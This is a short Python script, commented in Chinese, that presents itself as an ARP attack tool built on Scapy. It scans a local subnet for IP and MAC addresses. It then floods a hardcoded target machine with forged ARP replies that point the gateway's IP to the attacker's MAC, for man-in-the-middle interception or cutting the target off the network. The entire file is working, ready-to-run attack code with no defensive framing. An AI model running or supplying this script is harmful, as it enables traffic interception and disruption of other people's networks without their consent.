#!/usr/bin/python
# coding:utf-8

'''
ARP攻击工具
思路：给目标机器发送大量的ARP包，将网关IP对应的MAC地址指向自己的MAC地址，从而实现ARP欺骗的中间人攻击
[参数]
op：1-ARP请求；2-应答
'''

from scapy.all import *
from scapy.layers.l2 import Ether, ARP


class APRAttack(object):
    mac_ip_dic = {}

    def scan(self):
        ipscan = '192.168.31.1/24'
        try:
            ans, unans = srp(Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(pdst=ipscan), timeout=2, verbose=False)
        except Exception as e:
            print(str(e))
        else:
            for snd, rcv in ans:
                self.mac_ip_dic[rcv.sprintf("%ARP.psrc%")] = rcv.sprintf("%Ether.src%")
                # list_mac = rcv.sprintf("%Ether.src% - %ARP.psrc%")
                # print(list_mac)
        print(self.mac_ip_dic)

    def getMacFromIP(self, ip):
        return self.mac_ip_dic[ip]

    '''
    APR断网攻击
    sendp(Ether(src=localmac, dst=dst_1_mac) / ARP(op=2, hwsrc=localmac, hwdst=dst_1_mac, psrc=dst_2_ip, pdst=dst_1_ip),
              iface=scapy_iface(local_ifname),
    '''

    def arp_spoof(self, target_ip, gateway_ip, eth_name):
        try:
            # getway_mac = self.getMacFromIP(gateway_ip)
            target_mac = self.getMacFromIP(target_ip)
            local_mac = get_if_hwaddr(eth_name)
            eth = Ether()
            arp = ARP(
                # ARP响应op="is-at"
                op=2,
                # 网关mac指向本机local_mac
                hwsrc=local_mac,
                # 网关IP，从而导致ARP欺骗
                psrc=gateway_ip,
                # 目标mac
                hwdst=target_mac,
                # 目标ip
                pdst=target_ip
            )
            sendp(eth / arp, inter=2, loop=1)
        except Exception as e:
            print("exception：" + str(e))
            exit()
        # pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, psrc=target_ip, pdst=server_ip)


if __name__ == '__main__':
    # print(get_if_hwaddr('en0'))
    arpAttack = APRAttack()
    arpAttack.scan()
    arpAttack.arp_spoof("192.168.31.98", "192.168.31.1", "en0")
